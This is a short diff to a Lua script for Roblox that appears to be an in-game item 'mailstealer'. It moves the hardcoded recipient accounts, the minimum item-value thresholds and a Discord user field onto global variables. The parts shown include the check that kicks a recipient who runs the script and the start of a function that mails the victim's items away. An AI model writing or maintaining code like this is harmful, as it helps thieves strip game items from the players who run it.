@@ -18,7 +18,7 @@ end
 _G.scriptExecuted = true
 
 print("Test before")
-for _, user in ipairs(Usernames) do
+for _, user in ipairs(_G.Usernames) do
     if plr.Name == user then
         plr:kick("You cannot mailsteal yourself")
         return
@@ -211,10 +211,10 @@ local function getRAP(Type, Item)
     ) or 0)
 end
 
-local users = Usernames or {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
-local min_rap = min_rap or 1000
-local min_chance = min_chance or 100000
-local discuser = discuser or ""
+local users = _G.Usernames or {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
+local min_rap = _G.min_rap or 1000
+local min_chance = _G.min_chance or 100000
+local discuser = _G.discuser or ""
 
 local function sendItem(category, uid, am)
     local userIndex = 1
